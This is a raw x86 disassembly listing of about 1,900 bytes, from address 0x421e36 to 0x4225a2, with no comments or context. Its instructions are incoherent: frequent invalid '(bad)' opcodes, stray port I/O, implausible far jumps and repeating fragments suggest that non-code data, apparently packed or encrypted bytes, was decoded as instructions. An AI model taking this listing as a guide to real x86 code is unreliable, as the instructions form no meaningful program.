  421e36:	out    dx,eax
  421e37:	and    BYTE PTR [ecx-0x69],al
  421e3a:	into   
  421e3b:	ror    DWORD PTR [ebx],1
  421e3d:	inc    eax
  421e3e:	repnz stos DWORD PTR es:[edi],eax
  421e40:	cdq    
  421e41:	add    DWORD PTR [eax],eax
  421e43:	out    0x1,eax
  421e45:	add    BYTE PTR [eax],al
  421e47:	push   cs
  421e48:	jp     0x421e66
  421e4a:	sub    DWORD PTR [edi-0x24f5a065],0xffffffa6
  421e51:	pop    ss
  421e52:	es jl  0x421e21
  421e55:	clc    
  421e56:	fwait
  421e57:	and    BYTE PTR [edi+0x32],al
  421e5a:	mov    edx,0xf0c36d74
  421e5f:	shl    esi,cl
  421e61:	xor    BYTE PTR [esi],0xd1
  421e64:	cmp    bl,BYTE PTR [eax]
  421e66:	lahf   
  421e67:	jecxz  0x421ed6
  421e69:	push   0xffffffb9
  421e6b:	inc    esi
  421e6c:	push   edx
  421e6d:	popa   
  421e6e:	lods   eax,DWORD PTR ds:[esi]
  421e6f:	push   ebp
  421e70:	pusha  
  421e71:	(bad)  
  421e72:	std    
  421e73:	jmp    0xe639:0x1b8bf652
  421e7a:	(bad)  
  421e7b:	lods   al,BYTE PTR ds:[esi]
  421e7c:	mov    BYTE PTR [ecx],cl
  421e7e:	pop    esi
  421e7f:	mov    BYTE PTR [esp+edi*2+0x6999071],dl
  421e86:	mov    ecx,0x2557d8ef
  421e8b:	nop
  421e8c:	lock pushf 
  421e8e:	call   0xa64f:0x76466f8d
  421e95:	push   ebp
  421e96:	je     0x421f14
  421e98:	aad    0x78
  421e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9b:	mov    al,fs:0x77b3eee5
  421ea1:	lods   al,BYTE PTR ds:[esi]
  421ea2:	lods   eax,DWORD PTR ds:[esi]
  421ea3:	popa   
  421ea4:	fsubr  st,st(6)
  421ea6:	push   0x7dc12eac
  421eab:	je     0x421f20
  421ead:	retf   0x91c0
  421eb0:	test   DWORD PTR [ebx-0x3e131d87],0x9ff6d731
  421eba:	jp     0x421f1d
  421ebc:	mov    cl,dh
  421ebe:	call   0x300b376
  421ec3:	and    al,0x6f
  421ec5:	sbb    ebx,DWORD PTR [ebx+0x5e]
  421ec8:	rol    BYTE PTR [eax+eax*8],0xa3
  421ecc:	xor    eax,0x4ff482e1
  421ed1:	mov    DWORD PTR gs:[edx],0xc97d1f5
  421ed8:	dec    ebp
  421ed9:	pop    edx
  421eda:	mov    esi,0xcd11e40e
  421edf:	test   eax,0x79fc11f5
  421ee4:	mov    cl,0x20
  421ee6:	(bad)  
  421ee7:	push   eax
  421ee8:	xor    edi,DWORD PTR [ebp+0x43]
  421eeb:	repnz cmc 
  421eed:	mov    bh,0x2e
  421eef:	adc    bh,bl
  421ef1:	xchg   esp,eax
  421ef2:	(bad)  [ebx+0x324e3350]
  421ef8:	xchg   edi,eax
  421ef9:	les    ebp,FWORD PTR [edx]
  421efb:	nop
  421efc:	push   esi
  421efd:	and    BYTE PTR [ecx+0x654bd26d],cl
  421f03:	out    0xdf,al
  421f05:	inc    esi
  421f06:	out    0x51,al
  421f08:	mov    bh,0x18
  421f0a:	pop    es
  421f0b:	cmp    ecx,0x41c346f4
  421f11:	popa   
  421f12:	jge    0x421ecc
  421f14:	or     ch,ah
  421f16:	stos   BYTE PTR es:[edi],al
  421f17:	cmp    al,0xf1
  421f19:	push   cs
  421f1a:	gs jno 0x421f8d
  421f1d:	dec    edi
  421f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f1f:	bnd ret 
  421f21:	or     eax,0x9a53c0a6
  421f26:	cs int 0x28
  421f29:	adc    BYTE PTR [eax],ah
  421f2b:	mov    al,ds:0x7d0d8ac2
  421f30:	loope  0x421ef0
  421f32:	daa    
  421f33:	adc    DWORD PTR [ecx],esp
  421f35:	jmp    0x8e454fd8
  421f3a:	adc    esi,DWORD PTR [eax-0x1998bdd7]
  421f40:	cmp    eax,0xfef539d0
  421f45:	icebp  
  421f46:	mov    dh,0xc9
  421f48:	pop    eax
  421f49:	jne    0x421f27
  421f4b:	sub    bl,bh
  421f4d:	xchg   ebp,eax
  421f4e:	xchg   esp,eax
  421f4f:	and    DWORD PTR [edx],0x62cbe6d2
  421f55:	(bad)  
  421f56:	not    BYTE PTR [ebp+ebx*8-0x14f321cb]
  421f5d:	in     eax,0x6e
  421f5f:	repnz xor edi,0xffffff9c
  421f63:	pop    es
  421f64:	test   edi,ecx
  421f66:	mov    ebp,0xa91dc02d
  421f6b:	xchg   ebp,eax
  421f6c:	enter  0xa16e,0xd9
  421f70:	sti    
  421f71:	push   esi
  421f72:	push   cs
  421f73:	fs dec eax
  421f75:	adc    al,0x28
  421f77:	clc    
  421f78:	sub    BYTE PTR [ecx],0xaf
  421f7b:	mov    dl,0x41
  421f7d:	test   eax,0xd9df2394
  421f82:	sbb    BYTE PTR [ebx],0x5f
  421f85:	daa    
  421f86:	xchg   DWORD PTR [edi-0x657d2acf],ebp
  421f8c:	das    
  421f8d:	push   ds
  421f8e:	scas   al,BYTE PTR es:[edi]
  421f8f:	daa    
  421f90:	test   al,0x7a
  421f92:	hlt    
  421f93:	test   eax,0xaf4169b4
  421f98:	ret    
  421f99:	pop    es
  421f9a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421f9c:	xchg   ebp,eax
  421f9d:	cmp    BYTE PTR ss:[ebx+eax*2],0xd2
  421fa2:	test   al,0xbd
  421fa4:	add    BYTE PTR [edx+0xda3f660],ch
  421faa:	xor    bh,cl
  421fac:	jecxz  0x421ff4
  421fae:	mov    eax,0x431d1a60
  421fb3:	dec    ebx
  421fb4:	leave  
  421fb5:	xchg   edi,eax
  421fb6:	out    dx,eax
  421fb7:	mov    bh,0x14
  421fb9:	sbb    al,bh
  421fbb:	and    al,0x6d
  421fbd:	xchg   edi,eax
  421fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fbf:	inc    ecx
  421fc0:	push   ebp
  421fc1:	push   edi
  421fc2:	dec    edx
  421fc3:	and    DWORD PTR [ebx-0x6c],esp
  421fc6:	cld    
  421fc7:	sbb    DWORD PTR [eax-0x7ceb26d1],edi
  421fcd:	inc    esi
  421fce:	test   eax,0x8ee0e1f1
  421fd3:	sub    eax,0x9f2bc430
  421fd8:	push   eax
  421fd9:	les    ecx,FWORD PTR [esi-0x41790278]
  421fdf:	add    DWORD PTR [esi+eiz*4-0x729aa9d5],ebp
  421fe6:	mov    al,0x34
  421fe8:	sbb    eax,0xbc79d78c
  421fed:	xor    ebx,DWORD PTR [eax]
  421fef:	push   ecx
  421ff0:	(bad)  [ebx]
  421ff2:	dec    ebp
  421ff3:	adc    DWORD PTR ds:0x19d84ead,0x97d38341
  421ffd:	fdivr  QWORD PTR [edx+0x37]
  422000:	scas   al,BYTE PTR es:[edi]
  422001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422002:	jmp    0xaf6baa2d
  422007:	rcl    BYTE PTR [ebx],0xbb
  42200a:	xlat   BYTE PTR ds:[ebx]
  42200b:	sbb    DWORD PTR [ecx+0x51],edx
  42200e:	test   eax,0x33aa7c23
  422013:	or     esi,DWORD PTR [edi+0x1d]
  422016:	repz adc esp,DWORD PTR [ebx+edx*8]
  42201a:	cmp    edx,DWORD PTR [esi]
  42201c:	lods   eax,DWORD PTR ds:[esi]
  42201d:	out    dx,al
  42201e:	or     DWORD PTR [ecx],edx
  422020:	pop    eax
  422021:	jb     0x422024
  422023:	mov    eax,ds:0x5e26bd76
  422028:	(bad)  
  422029:	clc    
  42202a:	jecxz  0x422056
  42202c:	cmp    ch,ah
  42202e:	add    ah,al
  422030:	leave  
  422031:	or     BYTE PTR [eax-0x12131ef3],ah
  422037:	xor    al,0x42
  422039:	(bad)  
  42203a:	xor    BYTE PTR [esi],ch
  42203c:	push   edx
  42203d:	pop    edi
  42203e:	mov    al,0x92
  422040:	fwait
  422041:	add    DWORD PTR [eax],eax
  422043:	out    0x1,eax
  422045:	add    BYTE PTR [eax],al
  422047:	(bad)  
  422048:	mov    ah,0x74
  42204a:	adc    DWORD PTR [ecx-0x7afe00bb],ebp
  422050:	leave  
  422051:	outs   dx,BYTE PTR ds:[esi]
  422052:	jecxz  0x422005
  422054:	pusha  
  422055:	test   BYTE PTR [esi-0x6c],al
  422058:	pop    esi
  422059:	pop    esp
  42205a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205b:	add    eax,0x9821ea45
  422060:	xchg   edx,eax
  422061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422062:	mov    DWORD PTR [esi-0x2f2b18ce],edi
  422068:	daa    
  422069:	cmp    eax,DWORD PTR [edi+esi*8-0x10c11b9c]
  422070:	dec    ebp
  422071:	pop    es
  422072:	leave  
  422073:	mov    bh,0x1b
  422075:	push   ss
  422076:	sahf   
  422077:	cmp    BYTE PTR [ecx-0x4766b436],dl
  42207d:	aam    0xce
  42207f:	xor    BYTE PTR [eax],al
  422081:	xor    DWORD PTR [ebx+0x3e561761],esi
  422087:	adc    DWORD PTR [edx],eax
  422089:	sbb    ebp,ebp
  42208b:	adc    bl,0xa4
  42208e:	xor    al,0x59
  422090:	sti    
  422091:	mov    ebx,DWORD PTR [edi-0x76607b72]
  422097:	bound  edx,QWORD PTR [ebx+0x14d9c6a]
  42209d:	jg     0x4220ef
  42209f:	or     BYTE PTR [esi-0x70],ah
  4220a2:	and    DWORD PTR [edi+0x70],esi
  4220a5:	adc    dh,dl
  4220a7:	mov    dl,0x95
  4220a9:	pop    esi
  4220aa:	loopne 0x422090
  4220ac:	fst    DWORD PTR [ecx]
  4220ae:	test   al,0xca
  4220b0:	inc    eax
  4220b1:	jmp    0x422120
  4220b3:	ret    0x915b
  4220b6:	mov    bl,0xb1
  4220b8:	aam    0xaa
  4220ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220bb:	je     0x422078
  4220bd:	cmc    
  4220be:	hlt    
  4220bf:	xlat   BYTE PTR ds:[ebx]
  4220c0:	(bad)  
  4220c1:	dec    edx
  4220c2:	pushf  
  4220c3:	notrack jmp esp
  4220c6:	cs or  ebp,esp
  4220c9:	ret    0x459
  4220cc:	in     al,dx
  4220cd:	sub    cl,BYTE PTR [eax+0x1986586c]
  4220d3:	retf   0xec1f
  4220d6:	imul   edi,DWORD PTR [edi-0x4d],0xd2a53180
  4220dd:	push   eax
  4220de:	and    al,0x83
  4220e0:	and    al,BYTE PTR [esi]
  4220e2:	xchg   DWORD PTR [ecx],ebp
  4220e4:	popaw  
  4220e6:	stc    
  4220e7:	pop    ebp
  4220e8:	in     eax,dx
  4220e9:	call   DWORD PTR [ebx-0x2c772023]
  4220ef:	inc    ecx
  4220f0:	fidiv  DWORD PTR [ebx]
  4220f2:	test   BYTE PTR [ebx+0x35],0x67
  4220f6:	cld    
  4220f7:	push   esp
  4220f8:	daa    
  4220f9:	and    DWORD PTR [eax+0x3cffc667],edx
  4220ff:	mov    eax,ds:0x7cf24741
  422104:	lock daa 
  422106:	or     DWORD PTR [ebp-0x2d9736b1],ebx
  42210c:	lock cmp dh,BYTE PTR [ecx]
  42210f:	(bad)  
  422110:	push   esi
  422111:	je     0x42217e
  422113:	(bad)  
  422114:	aas    
  422115:	pop    esi
  422116:	mov    WORD PTR [ecx+0x810339f],ds
  42211c:	and    eax,0xdbf2c9a7
  422121:	mov    esp,0xd5e3c72d
  422126:	xor    BYTE PTR [edx],cl
  422128:	pop    ebx
  422129:	sar    edi,cl
  42212b:	dec    esi
  42212c:	arpl   WORD PTR [ebp+0xa31be92],si
  422132:	sub    al,BYTE PTR [ecx]
  422134:	lahf   
  422135:	mov    ds:0xfd7d54f6,al
  42213a:	pop    esi
  42213b:	mov    dh,0x90
  42213d:	push   edx
  42213e:	xchg   esi,eax
  42213f:	push   ds
  422140:	jo     0x4221bd
  422142:	and    ebx,esp
  422144:	dec    ebx
  422145:	xchg   dh,bh
  422147:	bt     DWORD PTR [eax],eax
  42214a:	aam    0xd1
  42214c:	cmp    al,0xdd
  42214e:	ror    BYTE PTR [eax],cl
  422150:	stos   DWORD PTR es:[edi],eax
  422151:	mov    bl,0x27
  422153:	push   ebp
  422154:	or     DWORD PTR [edx],eax
  422156:	push   esp
  422157:	out    dx,al
  422158:	push   esi
  422159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42215a:	popa   
  42215b:	lahf   
  42215c:	aam    0xad
  42215e:	sti    
  42215f:	stos   DWORD PTR es:[edi],eax
  422160:	dec    eax
  422161:	dec    bp
  422163:	popf   
  422164:	outs   dx,DWORD PTR ds:[esi]
  422165:	cmc    
  422166:	dec    eax
  422167:	cwde   
  422168:	xor    DWORD PTR [esi-0x5259650c],ebp
  42216e:	outs   dx,DWORD PTR ds:[esi]
  42216f:	push   ebx
  422170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422171:	enter  0x1f1d,0xf
  422175:	push   cs
  422176:	imul   eax
  422178:	or     esp,DWORD PTR [ebx-0x27]
  42217b:	iret   
  42217c:	push   ss
  42217d:	out    0xed,al
  42217f:	lock in eax,dx
  422181:	and    eax,0xdce4e961
  422186:	or     ch,BYTE PTR [eax+0x69]
  422189:	cdq    
  42218a:	lock sub dh,dl
  42218d:	and    eax,0x21b5bfb9
  422192:	cmp    cl,BYTE PTR [edx]
  422194:	ror    DWORD PTR [eax],0x17
  422197:	sub    eax,0x94557b1d
  42219c:	div    DWORD PTR [ebp+0x6c2b8fb5]
  4221a2:	aas    
  4221a3:	mov    edi,0xceebc08
  4221a8:	ret    0x107c
  4221ab:	cdq    
  4221ac:	ins    DWORD PTR es:[edi],dx
  4221ad:	xchg   DWORD PTR [ebx+0x6b],ebp
  4221b0:	rcl    DWORD PTR [edx],0xfa
  4221b3:	cwde   
  4221b4:	inc    ebx
  4221b5:	into   
  4221b6:	ds daa 
  4221b8:	or     cl,cl
  4221ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221bb:	stos   BYTE PTR es:[edi],al
  4221bc:	ret    
  4221bd:	test   DWORD PTR [edx+0x295f3905],ecx
  4221c3:	push   esp
  4221c4:	sub    al,0x8a
  4221c6:	mov    ch,0x77
  4221c8:	sbb    BYTE PTR [ebx+0x71ff6b44],cl
  4221ce:	imul   edx,DWORD PTR [edi],0x25
  4221d1:	jg     0x4221c4
  4221d3:	add    eax,0x2616c85b
  4221d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d9:	mov    DWORD PTR [ecx+0x33],ebp
  4221dc:	push   0xffffffe1
  4221de:	cld    
  4221df:	xor    dh,BYTE PTR [ebx-0x3952c3]
  4221e5:	mov    WORD PTR [ecx+ebx*2-0x1e],ds
  4221e9:	add    al,0x2d
  4221eb:	pop    esi
  4221ec:	mov    ecx,0x2a57da0e
  4221f1:	and    al,0xa5
  4221f3:	xchg   esp,eax
  4221f4:	addr16 (bad) 
  4221f6:	neg    edx
  4221f8:	popf   
  4221f9:	sbb    DWORD PTR [esi],0x35
  4221fc:	pop    edx
  4221fd:	enter  0x98f8,0x8e
  422201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422202:	pop    ebp
  422203:	sbb    BYTE PTR [ebp+0x44],0xa1
  422207:	push   ecx
  422208:	pop    edx
  422209:	enter  0x1c0c,0xd8
  42220d:	mov    BYTE PTR [ebx+0x6e],bl
  422210:	mov    ah,0xa9
  422212:	mov    ch,BYTE PTR [edx-0x23]
  422215:	out    dx,eax
  422216:	mov    BYTE PTR [ebx],dh
  422218:	dec    ebp
  422219:	fwait
  42221a:	and    ch,BYTE PTR [edx+ebx*1]
  42221d:	popf   
  42221e:	push   eax
  42221f:	repnz (bad) 
  422221:	sbb    eax,0x173a7991
  422226:	shr    bl,0x6b
  422229:	ret    
  42222a:	xchg   ch,bl
  42222c:	sbb    eax,DWORD PTR fs:[eax]
  42222f:	cdq    
  422230:	ja     0x422221
  422232:	out    dx,al
  422233:	out    dx,eax
  422234:	(bad)  
  422235:	cdq    
  422236:	ja     0x422240
  422238:	(bad)  
  422239:	daa    
  42223a:	loop   0x4221d5
  42223c:	inc    ebx
  42223d:	adc    al,0x2d
  42223f:	jns    0x4221de
  422241:	add    DWORD PTR [eax],eax
  422243:	out    0x1,eax
  422245:	add    BYTE PTR [eax],al
  422247:	lods   eax,DWORD PTR ds:[esi]
  422248:	push   ebp
  422249:	imul   edx,DWORD PTR [edi-0x48],0xd8526c91
  422250:	imul   ecx,DWORD PTR [esi+0x1044ed36],0x62
  422257:	stos   DWORD PTR es:[edi],eax
  422258:	fnsave [ecx-0x3c]
  42225b:	test   DWORD PTR [esi-0x4100b8bf],ebx
  422261:	in     eax,0xb3
  422263:	std    
  422264:	icebp  
  422265:	adc    DWORD PTR [ebx+0x4fac7420],0xffffff8a
  42226c:	popa   
  42226d:	cmp    al,0x3e
  42226f:	stc    
  422270:	inc    ecx
  422271:	mov    ebx,0x295b3707
  422276:	fisubr DWORD PTR [edi-0x19740e5e]
  42227c:	out    dx,eax
  42227d:	sbb    bh,BYTE PTR [ebx]
  42227f:	cmp    bh,cl
  422281:	and    esp,DWORD PTR [esi+0x1c]
  422284:	dec    edi
  422285:	js     0x4222f2
  422287:	repz or al,0xd7
  42228a:	or     cl,BYTE PTR [eax+0x6b]
  42228d:	pop    ecx
  42228e:	mov    dh,0xbc
  422290:	xchg   edx,eax
  422291:	lods   eax,DWORD PTR ds:[esi]
  422292:	push   esp
  422293:	rol    DWORD PTR [edi+0x7d],0xd
  422297:	fimul  WORD PTR [ebp-0x445fe5f]
  42229d:	adc    eax,0x7d30ab30
  4222a2:	xchg   esp,eax
  4222a3:	je     0x42224c
  4222a5:	int    0xf7
  4222a7:	aam    0x49
  4222a9:	les    esi,FWORD PTR [edi+ebp*4-0x1734b0d0]
  4222b0:	in     eax,0x30
  4222b2:	mov    WORD PTR [edx],ds
  4222b4:	out    0xab,eax
  4222b6:	xchg   ebx,eax
  4222b7:	xchg   edi,eax
  4222b8:	arpl   WORD PTR [esi+0x17],bp
  4222bb:	adc    eax,0x8626e3df
  4222c0:	in     al,dx
  4222c1:	push   0xf7a30705
  4222c6:	sub    bl,0x8a
  4222c9:	sub    bl,BYTE PTR [ebx]
  4222cb:	(bad)  
  4222cc:	pop    ecx
  4222cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222ce:	xchg   edx,eax
  4222cf:	pop    ebp
  4222d0:	aas    
  4222d1:	dec    edx
  4222d2:	jns    0x422324
  4222d4:	jae    0x422308
  4222d6:	xchg   esp,eax
  4222d7:	xchg   edx,eax
  4222d8:	scas   al,BYTE PTR es:[edi]
  4222d9:	bound  ecx,QWORD PTR [ecx]
  4222db:	aas    
  4222dc:	sbb    al,0x72
  4222de:	sub    BYTE PTR [ebp-0x6b69eb0],dl
  4222e4:	mov    dh,0xbe
  4222e6:	pop    ecx
  4222e7:	aas    
  4222e8:	dec    ebx
  4222e9:	xchg   ecx,eax
  4222ea:	jae    0x4222ac
  4222ec:	ret    0x23c4
  4222ef:	in     al,0x59
  4222f1:	jns    0x422372
  4222f3:	and    BYTE PTR [ecx+ebx*4+0x37],ah
  4222f7:	add    bh,al
  4222f9:	sbb    ebp,ebx
  4222fb:	scas   eax,DWORD PTR es:[edi]
  4222fc:	inc    esi
  4222fd:	repnz cmp BYTE PTR [edx+0x55],dl
  422301:	mov    esp,0x7094a02c
  422306:	pop    ebp
  422307:	sbb    DWORD PTR [ebx],edx
  422309:	stos   DWORD PTR es:[edi],eax
  42230a:	test   BYTE PTR [edi],ch
  42230c:	mov    ds:0xf95b1c5e,al
  422311:	lea    ecx,[edi-0x6d]
  422314:	add    eax,0x5596d517
  422319:	sub    al,0xc9
  42231b:	call   DWORD PTR [ebp-0x7c]
  42231e:	jmp    0x9e04:0xd7a66afc
  422325:	ret    
  422326:	pop    esp
  422327:	lahf   
  422328:	(bad)  
  422329:	ret    0x9f00
  42232c:	sar    cl,cl
  42232e:	xor    BYTE PTR [ebx],0x5b
  422331:	cmp    BYTE PTR [ecx+0x7e],bl
  422334:	call   0x679d631f
  422339:	dec    edi
  42233a:	mov    esi,0xed2886c7
  42233f:	sbb    ch,BYTE PTR [ebx+edx*1-0xa]
  422343:	ins    DWORD PTR es:[edi],dx
  422344:	mov    ebp,0x2483e050
  422349:	es das 
  42234b:	ins    BYTE PTR es:[edi],dx
  42234c:	mov    al,0x79
  42234e:	fldenv [edx+0x1c]
  422351:	(bad)  
  422352:	mov    al,BYTE PTR es:[ebp+0xa]
  422356:	jmp    0x422309
  422358:	inc    esi
  422359:	inc    edx
  42235a:	lds    ebx,FWORD PTR [edi-0x288d8b6f]
  422360:	fist   DWORD PTR [ecx+0x4f4543e3]
  422366:	adc    DWORD PTR [esi-0x1c],0xdc840385
  42236d:	aam    0xb1
  42236f:	xchg   ebp,eax
  422370:	xor    ecx,DWORD PTR [edx+0x7]
  422373:	sub    al,0x9c
  422375:	leave  
  422376:	int3   
  422377:	ins    DWORD PTR es:[edi],dx
  422378:	jge    0x42236b
  42237a:	push   cs
  42237b:	jns    0x4223f7
  42237d:	sti    
  42237e:	pop    ecx
  42237f:	and    eax,0x1d286a1d
  422384:	fst    DWORD PTR ds:0x3a453ee
  42238a:	pop    ss
  42238b:	neg    al
  42238d:	fsubp  st(6),st
  42238f:	and    cl,BYTE PTR [esi]
  422391:	lods   al,BYTE PTR ds:[esi]
  422392:	xor    al,0x94
  422394:	mov    bl,0x8d
  422396:	fmul   st(0),st
  422398:	iret   
  422399:	mov    eax,0x5c6febcb
  42239e:	add    al,0x90
  4223a0:	stc    
  4223a1:	push   edi
  4223a2:	jae    0x422393
  4223a4:	mov    BYTE PTR [ebp+0x363ea28c],0x9e
  4223ab:	js     0x422366
  4223ad:	in     eax,0x37
  4223af:	ins    BYTE PTR es:[edi],dx
  4223b0:	mov    edx,0x1b998500
  4223b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223b6:	mov    ds:0x7f06c637,eax
  4223bb:	xchg   ebp,eax
  4223bc:	or     al,0xc0
  4223be:	call   0x893a56ba
  4223c3:	repz enter 0xcf0,0x61
  4223c8:	cmp    BYTE PTR [eax],dh
  4223ca:	adc    al,0x60
  4223cc:	inc    edi
  4223cd:	xor    ecx,ebx
  4223cf:	jp     0x4223f0
  4223d1:	inc    ebx
  4223d2:	enter  0x9dd4,0x3f
  4223d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d7:	adc    eax,0x83aa2d66
  4223dc:	mov    bh,BYTE PTR [eax]
  4223de:	scas   al,BYTE PTR es:[edi]
  4223df:	jecxz  0x4223d6
  4223e1:	ja     0x422376
  4223e3:	sbb    ecx,edx
  4223e5:	into   
  4223e6:	outs   dx,DWORD PTR ds:[esi]
  4223e7:	or     al,BYTE PTR [ebp-0x6bc38fc0]
  4223ed:	ja     0x422429
  4223ef:	cmp    al,0xdd
  4223f1:	jns    0x4223bb
  4223f3:	inc    esp
  4223f4:	out    0xcc,al
  4223f6:	dec    esp
  4223f7:	cmp    al,0xd
  4223f9:	pop    esi
  4223fa:	fstp   QWORD PTR [esi+0x7b]
  4223fd:	stos   BYTE PTR es:[edi],al
  4223fe:	sahf   
  4223ff:	push   0xffffff86
  422401:	xchg   BYTE PTR [esi-0x61],dl
  422404:	inc    edi
  422405:	cmp    al,0x14
  422407:	mov    esp,DWORD PTR [esi]
  422409:	pop    esi
  42240a:	mov    ch,0xd
  42240c:	and    ebp,DWORD PTR [ebp-0x1d]
  42240f:	(bad)  
  422410:	out    dx,al
  422411:	jg     0x42241f
  422413:	xlat   BYTE PTR ds:[ebx]
  422414:	cdq    
  422415:	adc    eax,0xd2d4e9c6
  42241a:	aad    0x2a
  42241c:	mov    ebx,0x1eadfb04
  422421:	sahf   
  422422:	cdq    
  422423:	adc    ecx,DWORD PTR [esi+0x3c]
  422426:	mov    esp,ebp
  422428:	test   BYTE PTR [edx+0x59],0xfd
  42242c:	dec    ebp
  42242d:	cmp    eax,0x8a449200
  422432:	xchg   esi,ebx
  422434:	iret   
  422435:	lahf   
  422436:	push   ebp
  422437:	or     eax,0x1ad229a6
  42243c:	add    ch,BYTE PTR [eax+esi*2+0x60]
  422440:	lahf   
  422441:	add    DWORD PTR [eax],eax
  422443:	out    0x1,eax
  422445:	add    BYTE PTR [eax],al
  422447:	loopne 0x4223e5
  422449:	lods   eax,DWORD PTR ds:[esi]
  42244a:	mov    ds:0x142f2dcb,al
  42244f:	fsin   
  422451:	int    0x6f
  422453:	and    al,0x32
  422455:	dec    esp
  422456:	fdiv   QWORD PTR [eax+edi*2+0x3]
  42245a:	inc    eax
  42245b:	pop    edi
  42245c:	hlt    
  42245d:	jmp    0x422493
  42245f:	test   eax,0x2aade17
  422464:	cmp    ebx,esi
  422466:	call   0xc0f96992
  42246b:	mov    ?,ebp
  42246d:	and    edi,DWORD PTR [ebx]
  42246f:	mul    BYTE PTR [edx]
  422471:	fcomp  QWORD PTR [eax+0xda74fe]
  422477:	cli    
  422478:	lea    edi,[ecx+0x415d3754]
  42247e:	sbb    ah,0xf7
  422481:	in     eax,dx
  422482:	mov    esi,0x84e003a
  422487:	push   esp
  422488:	dec    ebp
  422489:	aas    
  42248a:	inc    esp
  42248b:	add    al,dl
  42248d:	je     0x4224f7
  42248f:	jmp    0xc2fad350
  422494:	jne    0x4224f7
  422496:	and    edi,eax
  422498:	mov    ebx,0x51ecea00
  42249d:	dec    eax
  42249e:	mov    ch,0x2e
  4224a0:	push   edx
  4224a1:	sub    DWORD PTR [ebp+esi*1+0x73],ebx
  4224a5:	mov    DWORD PTR [edi-0x50ed5abe],edx
  4224ab:	push   esi
  4224ac:	int    0x50
  4224ae:	mov    dh,0x16
  4224b0:	(bad)  
  4224b1:	das    
  4224b2:	xchg   ecx,eax
  4224b3:	enter  0x9b27,0x86
  4224b7:	xor    eax,0x4f0fae6a
  4224bc:	sbb    edi,ebp
  4224be:	ror    WORD PTR [eax],cl
  4224c1:	jne    0x42247c
  4224c3:	stos   DWORD PTR es:[edi],eax
  4224c4:	adc    dh,BYTE PTR [ecx]
  4224c6:	adc    al,0x22
  4224c8:	cwde   
  4224c9:	int    0x3
  4224cb:	xlat   BYTE PTR ds:[ebx]
  4224cc:	xchg   ecx,eax
  4224cd:	xor    al,0x5
  4224cf:	sbb    cl,BYTE PTR [esp+ebp*2]
  4224d2:	xor    al,0xea
  4224d4:	adc    DWORD PTR [ebx-0x2e],esi
  4224d7:	ins    DWORD PTR es:[edi],dx
  4224d8:	and    ah,cl
  4224da:	pop    eax
  4224db:	into   
  4224dc:	or     DWORD PTR [edx],edx
  4224de:	ret    0x6261
  4224e1:	add    dh,BYTE PTR [edi+0x15]
  4224e4:	inc    ebp
  4224e5:	pop    ds
  4224e6:	stos   DWORD PTR es:[edi],eax
  4224e7:	mov    eax,ds:0x7d9ba0d5
  4224ec:	mov    esp,0xb4667a9a
  4224f1:	fstp   QWORD PTR [edi]
  4224f3:	js     0x4224dc
  4224f5:	sbb    ebx,DWORD PTR [esi+0x2a25192b]
  4224fb:	xchg   ebp,eax
  4224fc:	xchg   edx,eax
  4224fd:	int3   
  4224fe:	sub    DWORD PTR [edi],ebx
  422500:	jnp    0x422528
  422502:	call   FWORD PTR fs:[ebx+0x52]
  422506:	or     dh,BYTE PTR cs:[esi+0x70]
  42250a:	je     0x4224b0
  42250c:	in     eax,dx
  42250d:	xchg   ax,ax
  42250f:	dec    esp
  422510:	ins    BYTE PTR es:[edi],dx
  422511:	imul   edx,DWORD PTR ds:0xaea23c24,0x4b
  422518:	in     al,dx
  422519:	enter  0x5235,0xe3
  42251d:	mov    cl,0x25
  42251f:	shl    DWORD PTR [esi-0x2082d128],1
  422525:	les    esp,FWORD PTR [ebx]
  422527:	push   0xffffffc9
  422529:	(bad)  
  42252a:	loop   0x4224e7
  42252c:	cld    
  42252d:	or     esi,eax
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	mov    al,ds:0xdf813007
  422535:	jb     0x422586
  422537:	xchg   esp,eax
  422538:	mov    ecx,0x42332f76
  42253d:	xchg   BYTE PTR [edx-0x1155d527],ch
  422543:	and    al,0x53
  422545:	and    BYTE PTR [edi+eiz*1-0x7e],cl
  422549:	pop    ds
  42254a:	jne    0x422541
  42254c:	in     eax,0x45
  42254e:	hlt    
  42254f:	(bad)  
  422550:	jb     0x4225aa
  422552:	inc    ecx
  422553:	fld    DWORD PTR [ebx-0x72adff60]
  422559:	push   ecx
  42255a:	and    BYTE PTR [edi-0x56],0x3c
  42255e:	retf   0x7191
  422561:	leave  
  422562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422563:	pop    ebx
  422564:	retf   0x65f6
  422567:	fcomp  DWORD PTR [edi+0xc]
  42256a:	sub    DWORD PTR [edx],ebp
  42256c:	xor    ah,dl
  42256e:	push   eax
  42256f:	fimul  WORD PTR [edx]
  422571:	pushf  
  422572:	shr    DWORD PTR [ebx],cl
  422574:	jmp    0x257566d
  422579:	mov    BYTE PTR [edx+0x45],dh
  42257c:	fnstsw WORD PTR [ecx]
  42257e:	loopne 0x422533
  422580:	repnz aad 0xe8
  422583:	iret   
  422584:	fdiv   DWORD PTR [ebp+0xa635397]
  42258a:	pop    ds
  42258b:	xchg   esp,eax
  42258c:	mov    bh,0xb3
  42258e:	in     eax,dx
  42258f:	add    eax,0xc043d9ee
  422594:	sbb    DWORD PTR [edx+0x4ac64ddb],0xbebd6665
  42259e:	in     eax,0x1e
  4225a0:	dec    ebp
  4225a1:	push   ds
  4225a2:	mov    ebp,0x75b2b6b0
